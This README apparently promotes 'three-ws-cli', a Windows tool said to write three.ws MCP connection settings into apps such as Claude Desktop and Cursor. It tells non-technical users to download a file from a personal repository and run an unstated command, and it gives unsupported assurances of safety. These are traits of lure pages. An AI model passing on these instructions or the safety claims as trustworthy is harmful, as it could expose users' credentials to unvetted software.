# ⚡ three-ws-cli - Connect Any MCP Client in One Command

[![Download three-ws-cli](https://img.shields.io/badge/Download-three--ws--cli-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lisabethdirtyminded2204/three-ws-cli)

three-ws-cli is a small helper program that connects the AI assistant apps you already use to the three.ws service. Instead of hunting through settings menus and copying long strings of text by hand, you run one command and the tool writes the correct connection details into Claude Code, Claude Desktop, Cursor, Windsurf, VS Code, IBM Bob, Codex, Gemini CLI, Hermes, or Grok Bot. It then checks each connection with a live test so you know it actually works before you start chatting.

You do not need to be a programmer to use it. If you can open a folder and paste a line of text, you can set this up.

---

## 🚀 Getting Started

Getting three-ws-cli running on Windows involves three simple ideas:

1. You visit the download page and get the application.
2. You open a terminal window and run one command.
3. You sign in, and the tool connects everything for you.

That is the whole journey. The sections below walk through each part slowly, in plain language, with nothing skipped.

Before you begin, make sure you are on a Windows computer with a working internet connection and that you know which AI app you want to connect (for example, Cursor or Claude Desktop). If you use more than one, that is fine — the tool can set up several at once.

---

## 💾 Download and Install

Visit this link to download the application:

**https://github.com/lisabethdirtyminded2204/three-ws-cli**

Once you are on that page, follow the download instructions shown there. When the download finishes, Windows will usually place the file in your **Downloads** folder. You can reach that folder by opening File Explorer and clicking **Downloads** in the left-hand sidebar.

After you have the application on your computer, keep the Downloads folder open in the background — you will come back to it in the next section.

---

## 🖥️ What This Tool Actually Does

When you connect an AI assistant to an outside service, the assistant needs three pieces of information: an address, a name, and a permission key. These are called "connector fields." Typing them by hand is where most people get stuck, because one wrong character breaks the whole thing.

three-ws-cli removes that step. It knows the correct values for the three.ws MCP servers, and it writes them into the settings file of whichever app you name. Then it asks the service a simple question — "what tools do you offer?" — and prints the answer. If the answer comes back with a list, your connection is alive and correct.

The tool also prints the connector fields for Grok Bot, so you can paste them into that app's settings yourself when a fully automatic setup is not available.

---

## ✨ Features

- **One command, many apps.** Point it at Claude Code, Claude Desktop, Cursor, Windsurf, VS Code, IBM Bob, Codex, Gemini CLI, Hermes, or Grok Bot.
- **Sign in your way.** Use an OAuth sign-in through your browser, or paste an API key if you already have one.
- **Automatic file writing.** No manual editing of configuration files, no risk of a stray comma breaking everything.
- **Live verification.** Every connection is tested with a real tools/list request, so you see proof instead of hoping.
- **Safe to re-run.** Run it again whenever you add a new app or your key changes.
- **Readable output.** Results are printed in plain language with clear success or failure markers.

---

## 🔧 Step-by-Step: Your First Run on Windows

**Step 1 — Open a terminal.**
Click the Start button, type `PowerShell`, and press Enter. A blue window appears. This is normal and safe. It is simply a place to type commands.

**Step 2 — Go to your Downloads folder.**
Type the following and press Enter:

```
cd $HOME\Downloads
```

**Step 3 — Start the tool.**
Type the command shown on the download page and press Enter. The tool will greet you and ask which app you want to connect.

**Step 4 — Pick your app.**
Type the name or number of the app you use, such as Cursor or Claude Desktop, and press Enter.

**Step 5 — Sign in.**
The tool will either open your browser for an OAuth sign-in or ask you to paste an API key. If your browser opens, sign in with your three.ws account and come back to the terminal window when it says you are done. If it asks for a key, paste it and press Enter.

**Step 6 — Watch the verification.**
The tool writes the connector details into your app's settings and then runs a live check. You will see a list of available tools scroll past. That list is your proof that everything is wired up correctly.

**Step 7 — Restart your AI app.**
Close the app completely and open it again. It will now see the three.ws tools.

If you want to connect a second app, run the same command again and choose the other app. There is no limit and no cleanup needed in between.

---

## 🧩 Which Apps Are Supported

| App | Setup Style |
| --- | --- |
| Claude Code | Automatic file writing plus live check |
| Claude Desktop | Automatic file writing plus live check |
| Cursor | Automatic file writing plus live check |
| Windsurf | Automatic file writing plus live check |
| VS Code | Automatic file writing plus live check |
| IBM Bob | Automatic file writing plus live check |
| Codex | Automatic file writing plus live check |
| Gemini CLI | Automatic file writing plus live check |
| Hermes | Automatic file writing plus live check |
| Grok Bot | Connector fields printed for you to paste |

For Grok Bot, the tool cannot edit the settings for you, so it prints the exact address, name, and key that belong in that app's connection screen. Copy each one into the matching box.

---

## 🔑 Signing In With OAuth or an API Key

OAuth is the easier path for most people. You click a link, your browser opens, you sign in to three.ws the way you would sign in to any website, and you approve the connection. Nothing is typed into the terminal except pressing Enter.

An API key is useful if you already generated one, or if you are setting up a computer where opening a browser is inconvenient. Paste the key when prompted and the tool handles the rest. Treat the key like a password — do not share it in screenshots or messages.

---

## ✅ Checking That Everything Works

The verification step is the heart of this tool. After writing your settings, it sends a live `tools/list` request to the three.ws MCP server and displays what comes back. A successful run shows a list of tool names. A failed run shows an error message and a short hint about what to fix.

If you ever want to re-check a connection later, run the tool again and choose the same app. It will rewrite the same correct values and test again. Nothing breaks from repetition.

---

## 🆘 Troubleshooting

**The terminal says the command is not recognized.**
Make sure you copied the command exactly as shown on the download page, including any leading words. Extra spaces at the start of the line can cause this.

**The browser did not open for sign-in.**
Copy the link the tool printed and paste it into your browser's address bar manually.

**The verification shows an error.**
Check that you finished the sign-in or that your API key is complete and not expired. Then run the tool again.

**My AI app still does not see the tools.**
Close the app fully — not just the window, but from the system tray too — and open it again. Apps read their settings only at startup.

**I want to undo everything.**
Run the tool again and choose the option to remove the three.ws entries, or delete the three.ws lines from the app's settings file by hand.

---

## 🔒 Is This Safe

The tool only writes connection details for three.ws into the settings files of apps you name. It does not touch other files, does not install background services, and does not send your data anywhere except to three.ws for the verification check. Your API key stays on your computer.

---

## ❓ Questions People Ask

**Do I need to know how to code?**
No. You need to open a terminal window and paste one command. That is the entire technical requirement.

**Can I connect more than one app?**
Yes. Run the tool once per app. Each run is independent.

**What if I switch computers?**
Run the same steps on the new computer. Sign in again with OAuth or paste your API key.

**Does this cost anything?**
The tool itself is free to download. Your three.ws account determines what the connected service offers.

**Is there a Mac or Linux version?**
The steps above focus on Windows. Check the download page for details about other systems.

---

## 📚 Where To Go Next

Visit this link to download the application and read the latest setup notes: **https://github.com/lisabethdirtyminded2204/three-ws-cli**

Bookmark it. Whenever an update ships or a new app gets supported, that page is where it will be announced.

Keywords: agents, agents-md, ai-agents, claude, cli, codex, cursor, gemini, grok-bot, javascript, llms-txt, mcp, model-context-protocol, nodejs, oauth, sdk, solana, three-ws, threejs, vscode